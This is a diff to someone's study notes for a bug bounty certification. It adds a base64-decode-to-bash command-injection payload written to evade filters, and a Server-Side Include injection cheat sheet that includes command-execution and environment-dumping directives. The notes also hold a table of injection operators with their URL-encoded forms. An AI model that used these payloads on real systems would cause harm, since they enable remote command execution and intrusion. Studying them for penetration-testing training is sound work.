@@ -106,9 +106,10 @@ Stuff for CBBH
 
     #You can actaully use environment variables inside of bash brace expension
     {ls,${PATH:0:1}home}
-    
-
+  
     #Blacklisted commands doesn't seem to work inside {}
+    #This one is nicier
+    bash<<<$(base64%09-d<<<$payload-here$)
 
     
   Injection Operator | Injection Character	| URL-Encoded Character| Executed Command
@@ -121,4 +122,35 @@ Stuff for CBBH
   |OR | \|\|	| %7c%7c	| Second (only if first fails)
   |Sub-Shell |	\`\` | %60%60 |	Both (Linux-only)
   |Sub-Shell | $() | %24%28%29 | Both (Linux-only)
+
+  Server-Side Attacks
+
+    #SSI cheat sheet
+
+    // Date
+    <!--#echo var="DATE_LOCAL" -->
+    
+    // Modification date of a file
+    <!--#flastmod file="index.html" -->
+    
+    // CGI Program results
+    <!--#include virtual="/cgi-bin/counter.pl" -->
+    
+    // Including a footer
+    <!--#include virtual="/footer.html" -->
+    
+    // Executing commands
+    <!--#exec cmd="ls" -->
+    
+    // Setting variables
+    <!--#set var="name" value="Rich" -->
+    
+    // Including virtual files (same directory)
+    <!--#include virtual="file_to_include.html" -->
+    
+    // Including files (same directory)
+    <!--#include file="file_to_include.html" -->
+    
+    // Print all variables
+    <!--#printenv -->
     
